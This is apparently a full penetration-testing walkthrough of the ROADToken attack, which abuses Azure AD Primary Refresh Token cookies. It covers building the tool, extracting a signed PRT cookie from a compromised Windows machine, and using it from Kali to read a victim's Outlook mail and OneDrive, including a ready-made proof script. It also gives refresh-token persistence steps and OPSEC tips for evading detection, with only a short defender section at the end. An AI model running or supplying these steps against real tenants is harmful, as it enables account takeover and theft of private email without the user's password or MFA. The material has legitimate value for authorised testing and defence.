# ROADToken — Azure AD PRT Cookie Abuse
## Complete Penetration Testing Guide

> **Scope:** Proof-of-concept demonstrating that an attacker with code execution on an Azure AD joined
> Windows machine can silently extract a Primary Refresh Token cookie, transfer it to a remote Kali
> attacker machine, and use it to authenticate to the victim's Microsoft 365 account — including
> reading Outlook email — without knowing the user's password, MFA code, or requiring admin rights.

---

## Table of Contents

1. [How the Attack Works](#1-how-the-attack-works)
2. [Understanding the Nonce — Deep Dive](#2-understanding-the-nonce--deep-dive)
3. [Environment Requirements](#3-environment-requirements)
4. [Building ROADToken.exe — No IDE Required](#4-building-roadtokenexe--no-ide-required)
5. [Kali Setup — Install All Tools](#5-kali-setup--install-all-tools)
6. [Phase 1 — Verify Target is Azure AD Joined](#6-phase-1--verify-target-is-azure-ad-joined)
7. [Phase 2 — Get the Nonce (Kali)](#7-phase-2--get-the-nonce-kali)
8. [Phase 3 — Extract PRT Cookie (Target Windows)](#8-phase-3--extract-prt-cookie-target-windows)
9. [Phase 4 — Authenticate with the Cookie (Kali)](#9-phase-4--authenticate-with-the-cookie-kali)
10. [Phase 5 — Access Victim Outlook (Kali)](#10-phase-5--access-victim-outlook-kali)
11. [Phase 5B — Visual Browser Proof with roadtx](#11-phase-5b--visual-browser-proof-with-roadtx-optional)
12. [What the Attacker Now Holds](#12-what-the-attacker-now-holds)
13. [OPSEC Considerations](#13-opsec-considerations)
14. [Troubleshooting](#14-troubleshooting)
15. [Defender Notes](#15-defender-notes)

---

## 1. How the Attack Works

### The Big Picture

```
KALI (attacker)                              TARGET (Windows, Azure AD joined)
═══════════════                              ══════════════════════════════════

Step 1: curl → Microsoft                     
  → get a nonce (public challenge)           
        │
        │  transfer nonce to target
        ▼
                                             Step 2: drop ROADToken.exe
                                             Step 3: ROADToken.exe <nonce>
                                                  │
                                                  ▼
                                             BrowserCore.exe signs PRT with nonce
                                             → outputs x-ms-RefreshTokenCredential JWT
        │
        │  copy JWT back to Kali
        ▼
Step 4: roadrecon auth --prt-cookie <JWT>
  → Microsoft validates the signed PRT
  → returns access token + refresh token
        │
        ▼
Step 5: Bearer token → Graph API
  → read victim's Outlook inbox
  → PROOF: victim's emails on attacker screen
```

### Why This Works

Modern Windows machines joined to Azure AD possess a **Primary Refresh Token (PRT)** — a
long-lived master token stored on the device. Microsoft's SSO system uses it to silently sign
you into any Office 365 / Azure AD application without re-entering credentials.

Chrome uses a Windows binary called `BrowserCore.exe` to request SSO cookies backed by the PRT.
The communication protocol between Chrome and BrowserCore is documented (it is Chrome's
**Native Messaging** protocol). ROADToken exploits the fact that `BrowserCore.exe` does NOT
verify that its caller is actually Chrome. Any process can call it directly.

The resulting signed JWT cookie is cryptographically valid — it was produced by the real
BrowserCore using the real PRT. Microsoft's login server accepts it as legitimate.

### Key Properties of the Obtained Token

| Property | Value |
|---|---|
| Valid for | 90 days (auto-renews on use) |
| MFA claim | Included (inherits from PRT) |
| Conditional Access | Passes device compliance checks |
| Works from | Any machine — not tied to origin device |
| Logged as | A normal sign-in event in Azure AD |
| Admin rights required | None — runs as the current user |

---

## 2. Understanding the Nonce — Deep Dive

This is the part that confuses most people: **why can you get a nonce without any authentication,
from any machine, with just one curl command?**

### What a Nonce Actually Is

A **nonce** ("number used once") in this context is a **server-generated random challenge value**.
Azure AD generates it on demand. Its sole purpose is to prevent replay attacks.

Without a nonce, the flow would be:
- Attacker captures an old PRT cookie → replays it forever → permanent access
- The nonce makes each PRT cookie valid for exactly ONE login attempt

### The Challenge-Response Protocol

This follows the same pattern used in Kerberos, TLS, and SSH:

```
                    AZURE AD                         DEVICE
                    ════════                         ══════

Step A:  "Give me a challenge"  ───────────────────►
         ◄──────── "Here is nonce: XYZ123"

Step B:  Sign(PRT + nonce + device_key) ──────────►
                                          Verify: was this signed by a
                                          device we know, with the right PRT,
                                          for this exact nonce?
         ◄──────── "Yes, here is your access token"
```

The critical insight: **Step A requires zero authentication by design.**

Azure AD MUST give you the nonce before you prove who you are, because the nonce is part of
HOW you prove who you are. If you needed to authenticate first to GET the nonce, it would be
a circular dependency — you cannot log in until you have the nonce, you cannot get the nonce
until you are logged in.

This is exactly how TLS works: the server sends a "ServerHello" with a random nonce in
plaintext before any authentication takes place.

### Why the Nonce Alone Is Completely Useless

```
PUBLIC  ──► Nonce (just a random string, anyone can have it)
PRIVATE ──► PRT Session Key (locked in device TPM or DPAPI-protected memory)
PROOF   ──► JWT = Sign(nonce + PRT, session_key)  ← only the device can produce this
```

An attacker who only has the nonce cannot produce a valid JWT. They would need the PRT
session key, which is locked inside the device's TPM (or protected memory). The nonce
without the device is like knowing a lock exists without having the key.

### So What Is the Actual Vulnerability?

The vulnerability is NOT that the nonce is public. The vulnerability is:

> **`BrowserCore.exe` does not verify that its caller is Chrome.**

Microsoft intended `BrowserCore.exe` to only be called by the Chrome extension
`com.microsoft.browsercore`. In practice, any process can call it. ROADToken exploits this
by calling BrowserCore directly, feeding it the nonce, and receiving back a signed JWT that
is cryptographically indistinguishable from one Chrome would have produced.

This means:
- The nonce from Kali is valid — Azure AD generated it legitimately
- BrowserCore on the TARGET uses the TARGET's real PRT to sign the JWT
- Azure AD validates the JWT → accepts it as genuine device authentication
- The attacker gets a real, fully valid session token

### Nonce Lifecycle

```
curl to Azure AD ──► Nonce generated ──► Valid for ~5–10 minutes ──► Expires
                                              │
                                              └──► Must use ROADToken within this window
```

Get the nonce → immediately run ROADToken.exe → immediately authenticate.
Do not let it sit.

---

## 3. Environment Requirements

### Target Machine (Windows)

| Requirement | Check command |
|---|---|
| Azure AD Joined | `dsregcmd /status` → `AzureAdJoined: YES` |
| User logged in with Azure AD account | User must be signed in |
| PRT present | `dsregcmd /status` → `AzureAdPrt: YES` |
| `BrowserCore.exe` present | `C:\Windows\BrowserCore\browsercore.exe` |
| Network access to Microsoft | `login.microsoftonline.com` reachable |

> Hybrid joined (both on-prem AD + Azure AD) also works. Pure on-prem AD only does NOT work.

### Attacker Machine (Kali Linux)

| Requirement | Notes |
|---|---|
| Python 3.9+ | `python3 --version` |
| pip | `pip3 --version` |
| Internet access | To reach `login.microsoftonline.com` and `graph.microsoft.com` |
| `ROADToken.exe` | Built binary, transferred from build machine |

### What You Need on the Target

Only **one file**: `ROADToken.exe`

No Python, no pip, no packages. The exe is self-contained.

---

## 4. Building ROADToken.exe — No IDE Required

> Visual Studio is NOT needed. Windows already ships with the C# compiler and MSBuild
> as part of the .NET Framework. You only need the source code and one command.

### How This Is Possible

Windows includes two key executables inside `C:\Windows\Microsoft.NET\`:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe  ← build system
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe      ← C# compiler
```

MSBuild reads the `.csproj` project file (plain XML), invokes `Csc.exe` on the source files,
and produces the `.exe`. Visual Studio is just a GUI that calls these same tools underneath.
The compiler itself has always been free and bundled with Windows — no license needed.

### Step 1 — Clone the Repository

Open PowerShell and clone the repo:

```powershell
git clone https://github.com/dirkjanm/ROADtoken.git
cd ROADtoken
```

### Step 2 — Apply the Two Required Fixes

The original source uses **C# 6 string interpolation** (`$"..."`) which the Windows built-in
compiler does not support (it is a C# 5 compiler). Visual Studio bundles a newer Roslyn
compiler that handles it — the system compiler does not.

Two files need small edits before the build succeeds.

#### Fix 1 — `Program.cs` (replace string interpolation)

Open `Program.cs` and replace the three interpolated strings:

```csharp
// BEFORE (C# 6 — breaks the system compiler)
Console.WriteLine($"Using nonce {nonce} supplied on command line");
$"\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce={nonce}\","
$"\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize\","

// AFTER (C# 5 — works with the system compiler)
Console.WriteLine("Using nonce " + nonce + " supplied on command line");
"\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" + nonce + "\","
"\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize\","
```

Or do it in one PowerShell command (run from inside the `ROADtoken` directory):

```powershell
$content = Get-Content Program.cs -Raw

$content = $content -replace `
    'Console\.WriteLine\(\$"Using nonce \{nonce\} supplied on command line"\);', `
    'Console.WriteLine("Using nonce " + nonce + " supplied on command line");'

$content = $content -replace `
    '\$"\\\"uri\\\":\\\"https://login\.microsoftonline\.com/common/oauth2/authorize\?sso_nonce=\{nonce\}\\\"," *`r?`n', `
    '"\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" + nonce + "\"," + Environment.NewLine'

$content = $content -replace `
    '\$"\\\"uri\\\":\\\"https://login\.microsoftonline\.com/common/oauth2/authorize\\\"," *`r?`n', `
    '"\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize\"," + Environment.NewLine'

Set-Content Program.cs $content -Encoding UTF8
```

> If the PowerShell regex approach is awkward in your environment, just edit the three lines
> manually in Notepad — the change is straightforward string concatenation.

The corrected section of `Program.cs` should look exactly like this:

```csharp
if (args.Length > 0)
{
    string nonce = args[0];
    Console.WriteLine("Using nonce " + nonce + " supplied on command line");
    stuff = "{" +
    "\"method\":\"GetCookies\"," +
    "\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" + nonce + "\"," +
    "\"sender\":\"https://login.microsoftonline.com\"" +
    "}";
}
else
{
    Console.WriteLine("No nonce supplied, refresh cookie will likely not work!");
    stuff = "{" +
        "\"method\":\"GetCookies\"," +
        "\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize\"," +
        "\"sender\":\"https://login.microsoftonline.com\"" +
    "}";
}
```

#### Fix 2 — `ROADToken.csproj` (change target framework)

The project targets `.NET Framework 4.5.2` but only the targeting pack for `v4.0` is
installed. They share the same runtime — this change has no functional impact on the tool.

Open `ROADToken.csproj` and change one line:

```xml
<!-- BEFORE -->
<TargetFrameworkVersion>v4.5.2</TargetFrameworkVersion>

<!-- AFTER -->
<TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
```

Or with PowerShell:

```powershell
(Get-Content ROADToken.csproj) `
    -replace '<TargetFrameworkVersion>v4\.5\.2</TargetFrameworkVersion>', `
             '<TargetFrameworkVersion>v4.0</TargetFrameworkVersion>' `
    | Set-Content ROADToken.csproj
```

### Step 3 — Build with MSBuild

Run this from inside the `ROADtoken` directory:

```powershell
& "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" ROADToken.csproj /p:Configuration=Release
```

### Expected Output (success)

```
Microsoft (R) Build Engine, version 4.8.9221.0
[Microsoft .NET Framework, Version 4.0.30319.42000]

CoreCompile:
  Csc.exe ... /out:obj\Release\ROADToken.exe ... Program.cs Properties\AssemblyInfo.cs

CopyFilesToOutputDirectory:
  ROADToken -> C:\...\ROADtoken\bin\Release\ROADToken.exe

Build succeeded.
    3 Warning(s)    ← harmless targeting pack warnings
    0 Error(s)
```

The warnings about targeting packs and processor architecture are harmless — the binary
works correctly regardless.

### Step 4 — Verify the Binary

```powershell
# Confirm the exe was created
ls bin\Release\ROADToken.exe

# Quick sanity test (no Azure AD join needed — will return OSError, that is expected)
.\bin\Release\ROADToken.exe
```

Expected sanity test output:
```
No nonce supplied, refresh cookie will likely not work!
r{"status": "Fail", "code": "OSError", "description": "Error processing request.", ...}
0
```

The `OSError` is expected here — it confirms BrowserCore.exe was found and called
successfully. The failure is because this machine either has no PRT or no nonce was
provided. The binary is working correctly.

### Build Summary

| Step | What happens |
|---|---|
| `git clone` | Downloads source code |
| Fix `Program.cs` | Makes code compatible with system C# compiler |
| Fix `.csproj` | Points to installed .NET version |
| `MSBuild.exe` | Compiles `Program.cs` → `ROADToken.exe` |
| Output | `bin\Release\ROADToken.exe` — ~7 KB, standalone, no dependencies |

---

## 5. Kali Setup — Install All Tools

Run this once on your Kali machine before the engagement:

```bash
# Update pip
python3 -m pip install --upgrade pip

# Install the full ROADtools suite
pip3 install roadrecon roadtx

# Verify installations
roadrecon --help
roadtx --help
```

Expected output from `roadrecon --help`:
```
ROADrecon - The Azure AD exploration tool.
By @_dirkjan - dirkjanm.io

positional arguments:
  {auth,gather,dump,gui,plugin}
    auth                Authenticate to Azure AD
    gather (dump)       Gather Azure AD information
    gui                 Launch the web-based GUI
    plugin              Run a ROADrecon plugin
```

### Optional: roadtx Browser Proof Setup

Only needed for Phase 5B (visual browser proof):

```bash
# Install Firefox and geckodriver for Selenium-based browser control
sudo apt install -y firefox-esr

# Download geckodriver (check https://github.com/mozilla/geckodriver/releases for latest)
GECKO_VER="v0.35.0"
wget -q "https://github.com/mozilla/geckodriver/releases/download/${GECKO_VER}/geckodriver-${GECKO_VER}-linux64.tar.gz"
tar -xzf geckodriver-${GECKO_VER}-linux64.tar.gz
sudo mv geckodriver /usr/local/bin/
sudo chmod +x /usr/local/bin/geckodriver

# Verify
geckodriver --version
```

---

## 6. Phase 1 — Verify Target is Azure AD Joined

Run this on the **target Windows machine** before anything else:

```powershell
dsregcmd /status
```

Look for these specific fields:

```
+----------------------------------------------------------------------+
| Device State                                                         |
+----------------------------------------------------------------------+

             AzureAdJoined : YES          ← MUST be YES
          EnterpriseJoined : NO
              DomainJoined : YES or NO    ← doesn't matter

+----------------------------------------------------------------------+
| User State                                                           |
+----------------------------------------------------------------------+

                 NgcSet : YES
            WorkplaceJoined : NO
              WamDefaultSet : YES
        AzureAdPrt : YES                  ← MUST be YES (PRT exists for this user)
```

### Quick one-liner check:

```powershell
dsregcmd /status | Select-String "AzureAdJoined|AzureAdPrt"
```

Expected:
```
AzureAdJoined : YES
AzureAdPrt : YES
```

If `AzureAdPrt : NO`, the current user has no PRT. Try signing out and back in with the
Azure AD account, or check if there is another signed-in user session.

### Also verify BrowserCore.exe exists:

```powershell
Test-Path "C:\Windows\BrowserCore\browsercore.exe"
Test-Path "C:\Program Files\Windows Security\BrowserCore\browsercore.exe"
```

At least one should return `True`.

---

## 7. Phase 2 — Get the Nonce (Kali)

Run on **Kali**. This is a single HTTP POST to Microsoft — no authentication required.

```bash
# Get the nonce from Azure AD
NONCE_RESPONSE=$(curl -s -X POST \
  "https://login.microsoftonline.com/common/oauth2/token" \
  -d "grant_type=srv_challenge")

echo "$NONCE_RESPONSE" | python3 -m json.tool
```

Expected response:
```json
{
    "Nonce": "AQABAAAAAADCoMpjJXrxTq9VG9te-7FX2rBuuPsFpQIW4_wk_IAK5pG2t1EdXLfKDDJotUpwFvQKzd0U_I_IKLw4CEQ5d9uzoWgbWEsY6lt1Tm3Kpw9CfiAA"
}
```

### Extract just the nonce string:

```bash
NONCE=$(echo "$NONCE_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin)['Nonce'])")
echo "Nonce: $NONCE"
```

### Save it for use in the next step:

```bash
echo "$NONCE" > nonce.txt
cat nonce.txt
```

> **Time is critical.** The nonce expires in approximately 5–10 minutes.
> Proceed immediately to Phase 3 after getting the nonce.

---

## 8. Phase 3 — Extract PRT Cookie (Target Windows)

### Step 1 — Transfer ROADToken.exe to the target

Use whatever access you have: SMB share, web server, RDP paste, etc.

The binary is located at:
```
ROADtoken\bin\Release\ROADToken.exe
```

### Step 2 — Run ROADToken.exe with the nonce

On the **target Windows machine** (PowerShell or CMD):

```powershell
.\ROADToken.exe <PASTE_YOUR_NONCE_HERE>
```

Example:
```powershell
.\ROADToken.exe AQABAAAAAADCoMpjJXrxTq9VG9te-7FX2rBuuPsFpQIW4_wk_IAK5pG2t1Ed...
```

### Expected Output (success):

```
Using nonce AQABAAAAAADCoMpj... supplied on command line
r{"response":[{"name":"x-ms-RefreshTokenCredential","data":"eyJhbGciOiJIUzI1NiIsImN0eCI6Ii...LONG_JWT_STRING..."}]}
0
```

The `r` at the start is the 4-byte binary length prefix from Chrome's Native Messaging
protocol being printed as text — it is harmless. The JWT you need is the value of the
`"data"` field — it starts with `eyJ`.

### Step 3 — Extract the JWT cleanly (PowerShell)

```powershell
# Capture the nonce first (paste from Kali)
$nonce = "AQABAAAAAADCoMpj..."

# Run ROADToken and extract just the JWT in one command
$raw = .\ROADToken.exe $nonce
$json_line = $raw | Where-Object { $_ -like '*RefreshTokenCredential*' }
$start = $json_line.IndexOf('{')
$json = $json_line.Substring($start) | ConvertFrom-Json
$prt_cookie = $json.response[0].data

Write-Host ""
Write-Host "=== PRT COOKIE (copy everything below this line) ===" -ForegroundColor Green
Write-Host $prt_cookie
Write-Host "=== END ===" -ForegroundColor Green
```

### Step 4 — Copy the JWT to Kali

The JWT is a long string starting with `eyJ`. Copy it entirely to your Kali machine.

On Kali, save it:
```bash
# Paste the JWT between the quotes
PRT_COOKIE="eyJhbGciOiJIUzI1NiIsImN0eCI6Ii...YOUR_FULL_JWT_HERE..."
echo "$PRT_COOKIE" > prt_cookie.txt
```

---

## 9. Phase 4 — Authenticate with the Cookie (Kali)

### Step 1 — Authenticate with roadrecon

```bash
# Read cookie from file
PRT_COOKIE=$(cat prt_cookie.txt)

# Authenticate — gets tokens for Azure AD Graph (user/group enumeration)
roadrecon auth --prt-cookie "$PRT_COOKIE"
```

Successful output:
```
Tokens were written to .roadtools_auth
```

### Step 2 — Verify what we got

```bash
# Decode and display the token contents
python3 -c "
import json, base64

with open('.roadtools_auth') as f:
    tokens = json.load(f)

# Decode the access token (JWT middle part)
access = tokens['accessToken']
payload = access.split('.')[1]
payload += '=' * (4 - len(payload) % 4)
decoded = json.loads(base64.b64decode(payload))

print('=== TOKEN INFORMATION ===')
print('User:      ', decoded.get('upn', decoded.get('unique_name', 'N/A')))
print('Tenant:    ', decoded.get('tid', 'N/A'))
print('MFA claim: ', decoded.get('amr', []))
print('Device ID: ', decoded.get('deviceid', 'N/A'))
print('Expires:   ', decoded.get('exp', 'N/A'), '(unix timestamp)')
print('Client:    ', decoded.get('appid', 'N/A'))
print()
print('Refresh token (first 60 chars):', tokens['refreshToken'][:60], '...')
"
```

This shows you the victim's UPN (email), tenant, and confirms MFA + device claims are present.

### Step 3 — Get a token scoped for Microsoft Graph (needed for Outlook)

```bash
# Re-authenticate targeting Microsoft Graph with Microsoft Office client
# Client d3590ed6 = Microsoft Office (public client, broad Graph permissions)
roadrecon auth --prt-cookie "$PRT_COOKIE" \
  -c d3590ed6-52b3-4102-aeff-aad2292ab01c \
  -r https://graph.microsoft.com

echo "Tokens saved. Extracting access token..."
GRAPH_TOKEN=$(python3 -c "import json; d=json.load(open('.roadtools_auth')); print(d['accessToken'])")
echo "Graph token obtained: ${GRAPH_TOKEN:0:40}..."
```

---

## 10. Phase 5 — Access Victim Outlook (Kali)

All commands run on **Kali** using the Graph token from Phase 4.

```bash
# Load the token
GRAPH_TOKEN=$(python3 -c "import json; d=json.load(open('.roadtools_auth')); print(d['accessToken'])")
```

### 5.1 — Get victim's profile

```bash
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me" \
  | python3 -m json.tool
```

Expected output (proof of identity):
```json
{
    "displayName": "John Smith",
    "mail": "john.smith@contoso.com",
    "userPrincipalName": "john.smith@contoso.com",
    "jobTitle": "Finance Manager",
    "mobilePhone": "+1-555-..."
}
```

### 5.2 — List Outlook inbox (latest 10 emails)

```bash
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?\$top=10&\$select=subject,from,receivedDateTime,isRead&\$orderby=receivedDateTime%20desc" \
  | python3 -m json.tool
```

Expected output:
```json
{
    "value": [
        {
            "subject": "Q2 Budget Review — Confidential",
            "from": {
                "emailAddress": {
                    "name": "CFO",
                    "address": "cfo@contoso.com"
                }
            },
            "receivedDateTime": "2026-04-29T09:14:22Z",
            "isRead": false
        }
    ]
}
```

### 5.3 — Read full body of a specific email

```bash
# Use the id value from the inbox listing above
EMAIL_ID="AAMkAGI2..."

curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages/${EMAIL_ID}?\$select=subject,body,from,toRecipients" \
  | python3 -m json.tool
```

### 5.4 — Search for sensitive emails

```bash
# Search for password reset emails
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$search=\"password reset\"&\$select=subject,from,receivedDateTime" \
  | python3 -m json.tool

# Search for anything marked confidential
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$search=\"confidential\"&\$top=5&\$select=subject,from,receivedDateTime" \
  | python3 -m json.tool
```

### 5.5 — List OneDrive files (bonus proof)

```bash
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/root/children?\$select=name,size,lastModifiedDateTime" \
  | python3 -m json.tool
```

### 5.6 — All-in-one proof script

Save this as `outlook-proof.sh` on Kali and run it as a single shot:

```bash
#!/bin/bash
# outlook-proof.sh — demonstrate Outlook access using PRT cookie
# Usage: ./outlook-proof.sh <prt_cookie_jwt>

set -e

PRT_COOKIE="${1:-$(cat prt_cookie.txt 2>/dev/null)}"

if [ -z "$PRT_COOKIE" ]; then
    echo "[!] Usage: $0 <prt_cookie_jwt>"
    echo "    or save the JWT to prt_cookie.txt"
    exit 1
fi

echo "[*] Authenticating with PRT cookie..."
roadrecon auth --prt-cookie "$PRT_COOKIE" \
  -c d3590ed6-52b3-4102-aeff-aad2292ab01c \
  -r https://graph.microsoft.com 2>&1 | grep -v "^$"

TOKEN=$(python3 -c "import json; d=json.load(open('.roadtools_auth')); print(d['accessToken'])")

echo ""
echo "[*] Getting victim profile..."
PROFILE=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me?\$select=displayName,mail,jobTitle")

NAME=$(echo "$PROFILE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('displayName','N/A'))")
EMAIL=$(echo "$PROFILE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('mail','N/A'))")
TITLE=$(echo "$PROFILE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('jobTitle','N/A'))")

echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║         ACCESS CONFIRMED — VICTIM IDENTITY       ║"
echo "╠══════════════════════════════════════════════════╣"
printf "║  Name:  %-41s║\n" "$NAME"
printf "║  Email: %-41s║\n" "$EMAIL"
printf "║  Title: %-41s║\n" "$TITLE"
echo "╚══════════════════════════════════════════════════╝"

echo ""
echo "[*] Fetching last 5 inbox emails..."
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?\$top=5&\$select=subject,from,receivedDateTime&\$orderby=receivedDateTime%20desc" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
msgs = data.get('value', [])
print()
print('  Recent Inbox:')
print('  ' + '-'*60)
for m in msgs:
    dt = m.get('receivedDateTime','')[:10]
    frm = m.get('from',{}).get('emailAddress',{}).get('address','?')
    subj = m.get('subject','(no subject)')[:45]
    print('  [' + dt + '] ' + frm)
    print('          ' + subj)
    print()
"
echo "[+] Done. Tokens saved to .roadtools_auth for further use."
```

Make it executable and run:

```bash
chmod +x outlook-proof.sh
./outlook-proof.sh "$(cat prt_cookie.txt)"
```

---

## 11. Phase 5B — Visual Browser Proof with roadtx (Optional)

This opens a real Firefox window on your Kali machine, logged in as the victim directly inside
Outlook Web App. Most visual proof possible for a client presentation.

Requires geckodriver installed (see Section 5).

```bash
PRT_COOKIE=$(cat prt_cookie.txt)

# Open Firefox on Kali, logged in as victim, directly at Outlook
roadtx browserprtauth \
  --prt-cookie "$PRT_COOKIE" \
  --url "https://outlook.office.com/mail"
```

Firefox will open and land directly on the victim's Outlook inbox — no password prompt.

For other Microsoft 365 apps:

```bash
# SharePoint
roadtx browserprtauth --prt-cookie "$PRT_COOKIE" --url "https://contoso.sharepoint.com"

# Teams
roadtx browserprtauth --prt-cookie "$PRT_COOKIE" --url "https://teams.microsoft.com"

# Azure Portal
roadtx browserprtauth --prt-cookie "$PRT_COOKIE" --url "https://portal.azure.com"
```

---

## 12. What the Attacker Now Holds

After Phase 4, the `.roadtools_auth` file contains:

| Token | Validity | Use |
|---|---|---|
| `accessToken` | ~1 hour | Direct API calls right now |
| `refreshToken` | **90 days, auto-renews** | Get new access tokens anytime |

### The refresh token is the key asset

The refresh token is completely detached from the target machine. Even if:
- The target machine is turned off → still works
- The user changes their password → still works (until explicitly revoked)
- The device is wiped → still works

The ONLY ways to invalidate it:
- Admin runs: `Set-AzureADUser -ObjectId <user> -RefreshTokensValidFromDateTime (Get-Date)`
- Admin disables the device object in Azure AD (access still works, but loses Conditional Access compliance)

### Using the refresh token later (persistence)

```bash
# Weeks later — get a fresh access token without touching the target again
roadrecon auth --refresh-token file \
  -c d3590ed6-52b3-4102-aeff-aad2292ab01c \
  -r https://graph.microsoft.com
```

---

## 13. OPSEC Considerations

### What gets logged in Azure AD

| Action | Logged? |
|---|---|
| `roadrecon auth --prt-cookie` | YES — appears in Sign-in logs |
| Each `roadrecon gather` | YES — sign-in log |
| Using refresh token for new access token | NO — not in sign-in logs |
| Graph API calls with access token | NO — not in sign-in logs |

### What defenders can detect on the target

ROADToken spawns `BrowserCore.exe` from a non-standard parent process. Chrome normally calls it like:
```
cmd.exe /d /c "BrowserCore.exe" chrome-extension://... --parent-window=0 < \\.\pipe\... > \\.\pipe\...
```

ROADToken calls it directly with stdin/stdout redirected — no named pipes, no Chrome parent.

A defender with command-line logging (Sysmon Event ID 1) would see:
```
BrowserCore.exe called by ROADToken.exe with no pipe arguments ← anomalous
```

### Reduce noise

- Run ROADToken once, get the cookie, do not re-run
- All subsequent access via refresh token on Kali — no target interaction needed
- Proxy Kali traffic through the target network range to match expected IP in sign-in logs:
  ```bash
  roadrecon auth --prt-cookie "$PRT_COOKIE" --proxy http://your-proxy:8080
  ```

---

## 14. Troubleshooting

### Build fails — `error CS1056: Unexpected character '$'`

The system C# compiler does not support string interpolation. Apply Fix 1 from Section 4
(replace `$"..."` with string concatenation).

---

### Build fails — targeting pack warning becomes error

```
warning MSB3644: Reference assemblies for framework ".NETFramework,Version=v4.5.2" not found
```

Apply Fix 2 from Section 4 (change `v4.5.2` to `v4.0` in the `.csproj` file).

---

### ROADToken returns `OSError` / error code `-2147186941`

```
{"status": "Fail", "code": "OSError", "description": "Error processing request."}
```

**Cause:** Machine is not Azure AD joined, or current user has no PRT.

**Fix:** Run `dsregcmd /status` — verify `AzureAdJoined: YES` and `AzureAdPrt: YES`.

---

### `roadrecon auth` returns nothing / authentication fails

**Cause 1:** Nonce expired (older than ~10 minutes).

**Fix:** Get a fresh nonce from Kali and re-run ROADToken immediately.

```bash
NONCE=$(curl -s -X POST https://login.microsoftonline.com/common/oauth2/token \
  -d "grant_type=srv_challenge" | python3 -c "import sys,json; print(json.load(sys.stdin)['Nonce'])")
echo "New nonce: $NONCE"
```

**Cause 2:** JWT was corrupted when copying.

**Fix:** The JWT must be copied exactly — no line breaks, no spaces. It starts with `eyJ` and
is typically 500–1000 characters. Verify length:
```bash
echo "$PRT_COOKIE" | wc -c
```

---

### Graph API returns `401 Unauthorized`

**Cause:** Access token is scoped to `graph.windows.net` instead of `graph.microsoft.com`.

**Fix:** Re-authenticate with the correct resource:
```bash
roadrecon auth --prt-cookie "$PRT_COOKIE" \
  -c d3590ed6-52b3-4102-aeff-aad2292ab01c \
  -r https://graph.microsoft.com
```

---

### Graph API returns `403 Forbidden`

**Cause:** The client app does not have permission for the endpoint you are calling.

**Fix:** Try a different public client ID:
```bash
# Microsoft Teams client
roadrecon auth --prt-cookie "$PRT_COOKIE" \
  -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 \
  -r https://graph.microsoft.com
```

---

### `roadtx browserprtauth` fails — geckodriver not found

```bash
which geckodriver      # should return /usr/local/bin/geckodriver
geckodriver --version  # should return version number
```

If missing, re-run the geckodriver install from Section 5.

---

### BrowserCore.exe not found on target

ROADToken searches two paths:
- `C:\Windows\BrowserCore\browsercore.exe`
- `C:\Program Files\Windows Security\BrowserCore\browsercore.exe`

Check which exists:
```powershell
Get-Item "C:\Windows\BrowserCore\browsercore.exe" -ErrorAction SilentlyContinue
Get-Item "C:\Program Files\Windows Security\BrowserCore\browsercore.exe" -ErrorAction SilentlyContinue
```

If neither exists, the machine does not have the SSO component installed and the attack
cannot proceed on this target.

---

## 15. Defender Notes

### Immediate detection opportunities

- **Sysmon Event ID 1:** `BrowserCore.exe` spawned without named pipe arguments, or with a
  non-Chrome/non-Edge parent process
- **Azure AD Sign-in logs:** Sign-in from unexpected IP or user agent for the user
- **Azure AD Sign-in logs:** Sign-in using `Azure AD PowerShell` or `Microsoft Office` app ID
  without corresponding legitimate use

### Hardening

- **Require TPM for PRT:** Machines with TPM 2.0 where the PRT session key is stored IN the
  TPM make it significantly harder to abuse (the key never leaves the TPM)
- **Conditional Access — compliant device:** Policies requiring Intune compliance add a layer,
  but note the token obtained DOES include the device ID and compliance claim
- **Sign-in frequency policy:** Limits how long refresh tokens stay valid
- **Revoke refresh tokens on incident:**
  ```powershell
  # Revoke all refresh tokens for a user (requires admin)
  Connect-AzureAD
  Revoke-AzureADUserAllRefreshToken -ObjectId "user@domain.com"
  Set-AzureADUser -ObjectId "user@domain.com" `
    -RefreshTokensValidFromDateTime (Get-Date)
  ```
- **Disable compromised device in Azure AD:** Azure AD → Devices → find device → Disable.
  This does not kill existing refresh tokens but removes the device compliance claim.

---

*Tool: ROADToken by @dirkjanm — https://github.com/dirkjanm/ROADtoken*
*Framework: ROADtools by @dirkjanm — https://github.com/dirkjanm/ROADtools*
*Reference: https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/*
